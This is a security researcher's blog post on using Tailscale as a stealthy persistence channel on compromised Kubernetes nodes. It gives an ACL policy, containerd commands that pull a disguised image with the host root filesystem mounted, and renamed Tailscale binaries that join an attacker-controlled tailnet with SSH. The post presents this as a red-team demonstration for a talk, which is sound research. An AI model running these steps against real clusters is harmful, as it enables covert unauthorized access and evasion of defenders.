---
layout: post
title: "Using Tailscale for persistence" 
date: 2024-03-24 08:27:00 +0100
comments: false
categories: Tailscale
---

I've written [before](https://raesene.github.io/blog/2022/06/11/escaping-the-nested-doll-with-tailscale/) about how there's lots of innovative uses for [Tailscale](https://tailscale.com/) and I was playing with another scenario for my [Cloud Native Rejekts talk](https://cfp.cloud-native.rejekts.io/cloud-native-rejekts-eu-paris-2024/talk/ZJEVSY/) ([Video Recording here](https://www.youtube.com/watch?v=-9GN057zm_U&t=19240s) ), so I thought it'd be worth writing up as I learned some things along the way!

The idea here is to see how someone could use Tailscale as part of getting persistence on a compromised system (for example a Kubernetes cluster) to keep access in a relatively stealthy fashion. We're running Tailscale inside a container running on a Kubernetes node and we want to communicate back to a host outside the cluster over the network.

Whilst Tailscale generally uses UDP for its communications, it can also communicate over 443/TCP using [DERP](https://tailscale.com/blog/how-tailscale-works#encrypted-tcp-relays-derp) meaning it should work as long as the compromised host can initiate outbound connections on 443/TCP (a reasonably common configuration!)

## Setting up our tailnet

For this I set-up a new isolated tailnet, to keep the ACLs simple. It's relatively easy to switch between tailnets, so there's no major downside to having a dedicated tailnet, as all the features we want to use are available on Tailscale's free tier.

Once we've got our new tailnet, the goal is to have two groups of systems. The first one is our controllers, which will connect back into our compromised node(s). The second group is the "bots" which we'll install on our target systems.

Then we want to configure Tailscale so that traffic from the controllers to the bots is allowed, but no traffic from bots back to controllers (or bots to other bots) is permitted. Tailscale provide a nice ACL system, which we can use to create this setup.

```
{

	// Create our bots and controllers groups
	"tagOwners": {
		"tag:bots":        ["autogroup:admin"],
		"tag:controllers": ["autogroup:admin"],
	},

	"acls": [
		// Accept traffic from controllers to bots
		{"action": "accept", "src": ["tag:controllers"], "dst": ["tag:bots:*"]},
	],

	// Define users and devices that can use Tailscale SSH.
	"ssh": [
		// Accept SSH connections from controllers to bots
		{
			"action": "accept",
			"src":    ["tag:controllers"],
			"dst":    ["tag:bots"],
			"users":  ["autogroup:nonroot", "root"],
		},
	],
}

```

One slightly un-intuitive piece is that you need to define tags in an ACL policy *before* assigning them to any hosts. 

Once the ACL policy is in place you can just assign a tag to the control host in the Tailscale GUI

![Tailscale ACL]({{site.url }}/assets/media/tailscale-acl.png)

For our bots, we can use Tailscale's [Auth Key](https://tailscale.com/kb/1085/auth-keys) feature, and generate a key that can be used for all our bots, but also has the "bot" tag applied to it automatically, so there's no risk of them inadvertently getting more access than we want.

![Tailscale ACL]({{site.url }}/assets/media/tailscale-auth-keys.png)

## Running Tailscale on our bot hosts

Now that we've got our tailnet configured, the next step is to deploy on our compromised hosts. In the scenario I used for my talk, the attacker has access to cluster-admin level credentials for a brief period of time, so wants to use Tailscale to help them retain access after that window of opportunity closes.

One way of running Tailscale that should always work is to use a container, as typically Kubernetes cluster nodes can always run containers :) We could either run a new container using the runtime on the node (e.g. Containerd) or use Kubernetes static manifests to have the Kubelet run it for us.

### Running with Containerd

It's possible to use Containerd to run a new container on a Kubernetes node using the provided `ctr` client. Whilst there are better clients like `nerdctl` available, `ctr` will always be available and we can do what we need with it.

One slight complication with this approach is that it won't work from inside a container (for example the one provided by `kubectl debug node`), as Containerd's API expects the client to have the same resources available to it as the server (unlike Docker, where all that's required is access to the Docker socket). You can get round this by doing something like SSH'ing to the node.

First up we'll create a new Containerd namespace. This makes it a little harder to spot the container if someone looks at the containers running on the host.

```
ctr namespace create sys_net_mon
```

Once we've created the namespace, we can pull a new container image down to the node. In my case I've created an image on Docker hub with Tailscale and a couple of other tools, which I called `systemd_net_mon` , no need to make the blue team's job too easy by calling it something like "botnet_node" :D

```
ctr -n sys_net_mon images pull docker.io/raesene/systemd_net_mon:latest
```

Once the image is available on the node we can just run it, while providing full access to the node filesystem.

```
ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/raesene/systemd_net_mon:latest sys_net_mon
```

Then from inside the container, we just need two commands to start Tailscale up and connect it to our tailnet. Here we can make use of the fact that Tailscale is provided as a pair of Golang binaries, by just renaming the server to `systemd_net_mon_server` and the client to `systemd_net_mon_client`. That way if someone runs a process list on the host, that's all they'll see, a bit less obvious than Tailscale itself.

```
systemd_net_mon_server --tun=userspace-networking --socks5-server=localhost:1055 &
```

```
systemd_net_mon_client up --ssh --hostname cafebot --auth-key=[AUTH_KEY_HERE]
```

With that, our bot will be up and connected to the tailnet. We can then connect to it via Tailscale's embedded SSH daemon, with all the traffic going over the Tailscale tunnel.

### Running with static manifests

Another way of doing this is to create a static Kubernetes manifest and put it in the directory the Kubelet watches (e.g. `/etc/kubernetes/manifests`). The advantages of this approach is that they Kubelet will take care of re-starting the pod if necessary.

## Conclusion

This was just a quick walkthrough of using Tailscale for creating a little "botnet". Whilst there are many tools to do this with, it's always interesting to explore other options!